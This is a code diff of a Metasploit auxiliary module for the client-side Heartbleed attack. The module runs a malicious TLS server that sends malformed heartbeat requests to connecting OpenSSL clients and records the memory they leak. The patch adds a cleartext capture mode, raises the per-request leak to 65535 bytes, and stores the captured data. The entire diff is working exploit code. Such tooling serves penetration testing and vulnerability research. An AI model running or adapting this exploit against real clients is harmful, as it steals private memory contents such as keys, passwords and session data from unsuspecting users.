@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'License'        => MSF_LICENSE,
       'Actions'        => [['Capture']],
-      'PassiveActions' => [['Capture']],
+      'PassiveActions' => ['Capture'],
       'DefaultAction'  => 'Capture',
       'References'     =>
         [
@@ -44,7 +44,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 8443 ]),
         OptInt.new('HEARTBEAT_LIMIT', [true, "The number of kilobytes of data to capture at most from each client", 512]),
-        OptInt.new('HEARTBEAT_READ', [true, "The number of bytes to leak in the heartbeat response", 16384])
+        OptInt.new('HEARTBEAT_READ', [true, "The number of bytes to leak in the heartbeat response", 65535]),
+        OptBool.new('NEGOTIATE_TLS', [true, "Set this to true to negotiate TLS and often leak more data at the cost of CA validation", false])
       ], self.class)
   end
 
@@ -52,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
   def setup
     super
     @state    = {}
-    @cert_key = OpenSSL::PKey::RSA.new(1024){ }
+    @cert_key = OpenSSL::PKey::RSA.new(1024){ } if negotiate_tls?
   end
 
   # Setup the server module and start handling requests
@@ -69,6 +70,11 @@ class Metasploit3 < Msf::Auxiliary
   # Determine how much heartbeat data to capture at the most
   def heartbeat_limit
     datastore['HEARTBEAT_LIMIT'].to_i * 1024
+  end
+
+  # Determine whether we should negotiate TLS or not
+  def negotiate_tls?
+    !! datastore['NEGOTIATE_TLS']
   end
 
   # Initialize a new state for every client
@@ -165,33 +171,54 @@ class Metasploit3 < Msf::Auxiliary
       @state[c][:client_random]  = data[11,32]
       @state[c][:received_hello] = true
 
-      print_status("#{@state[c][:name]} Sending Server Hello and certificate...")
+      print_status("#{@state[c][:name]} Sending Server Hello...")
       openssl_send_server_hello(c, data)
       return
     end
 
-    # Process the Client Key Exchange
-    if message_type == 0x16 and data.length > 11 and message_code == 0x10
-      print_status("#{@state[c][:name]} Processing Client Key Exchange...")
-      premaster_length = data[9, 2].unpack("n").first
+    # If we are negotiating TLS, handle Client Key Exchange/Change Cipher Spec
+    if negotiate_tls?
+      # Process the Client Key Exchange
+      if message_type == 0x16 and data.length > 11 and message_code == 0x10
+        print_status("#{@state[c][:name]} Processing Client Key Exchange...")
+        premaster_length = data[9, 2].unpack("n").first
 
-      # Extract the pre-master secret in encrypted form
-      if data.length >= 11 + premaster_length
-        premaster_encrypted = data[11, premaster_length]
+        # Extract the pre-master secret in encrypted form
+        if data.length >= 11 + premaster_length
+          premaster_encrypted = data[11, premaster_length]
 
-        # Decrypt the pre-master secret using our RSA key
-        premaster_clear = @cert_key.private_decrypt(premaster_encrypted) rescue nil
-        @state[c][:premaster] = premaster_clear if premaster_clear
+          # Decrypt the pre-master secret using our RSA key
+          premaster_clear = @cert_key.private_decrypt(premaster_encrypted) rescue nil
+          @state[c][:premaster] = premaster_clear if premaster_clear
+        end
+      end
+
+      # Process the Change Cipher Spec and switch to encrypted communications
+      if message_type == 0x14 and message_code == 0x01
+        print_status("#{@state[c][:name]} Processing Change Cipher Spec...")
+        initialize_encryption_keys(c)
+        return
+      end
+    # Otherwise just start capturing heartbeats in clear-text mode
+    else
+      # Send heartbeat requests
+      if @state[c][:heartbeats].length < heartbeat_limit
+        openssl_send_heartbeat(c)
+      end
+
+      # Process cleartext heartbeat replies
+      if message_type == 0x18
+        vprint_status("#{@state[c][:name]} Heartbeat received (#{data.length-5} bytes) [#{@state[c][:heartbeats].length} bytes total]")
+        @state[c][:heartbeats] << data[5, data.length-5]
+      end
+
+      # Full up on heartbeats, disconnect the client
+      if @state[c][:heartbeats].length >= heartbeat_limit
+        print_status("#{@state[c][:name]} Heartbeats received [#{@state[c][:heartbeats].length} bytes total]")
+        store_captured_heartbeats(c)
+        c.close()
       end
     end
-
-    # Process the Change Cipher Spec and switch to encrypted communications
-    if message_type == 0x14 and message_code == 0x01
-      print_status("#{@state[c][:name]} Processing Change Cipher Spec...")
-      initialize_encryption_keys(c)
-      return
-    end
-
   end
 
   # Process encrypted TLS messages
@@ -290,6 +317,13 @@ class Metasploit3 < Msf::Auxiliary
     msg1 = "\x16\x03\x02" + [server_hello.length].pack("n") + server_hello
     c.put(msg1)
 
+    # Skip the rest of TLS if we arent negotiating it
+    unless negotiate_tls?
+      # Send a heartbeat request to start the stream and return
+      openssl_send_heartbeat(c)
+      return
+    end
+
     # Certificates
     certs_combined = generate_certificates
     pay2 = "\x0b" + [ certs_combined.length + 3 ].pack("N")[1, 3] + [ certs_combined.length ].pack("N")[1, 3] + certs_combined
@@ -354,7 +388,6 @@ class Metasploit3 < Msf::Auxiliary
     cert.sign(key, OpenSSL::Digest::SHA1.new)
     cert
   end
-
 
   # Decrypt the TLS message and return the result without the MAC
   def decrypt_data(c, data)
